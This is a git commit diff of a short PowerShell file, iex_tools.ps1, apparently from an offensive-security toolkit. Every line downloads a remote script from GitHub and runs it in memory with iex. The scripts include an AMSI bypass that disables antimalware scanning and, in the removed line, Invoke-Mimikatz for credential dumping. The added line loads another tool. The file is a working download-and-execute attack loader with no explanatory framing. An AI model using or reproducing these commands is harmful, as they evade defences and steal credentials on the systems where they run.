c493beb1d2a6db074abc18d31a9069d118632e3b
Rob <61951374+Leo4j@users.noreply.github.com>
2022-12-31 11:50:43 +0000

    Update iex_tools.ps1

--- iex_tools.ps1
+++ iex_tools.ps1
@@ -1,3 +1,3 @@
 iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/NET_AMSI_Bypass/main/NETAMSI.ps1")
 iex(new-object net.webclient).downloadstring("https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Ribes.ps1")
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1')
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Tools/main/Invoke-Patagonia.ps1')
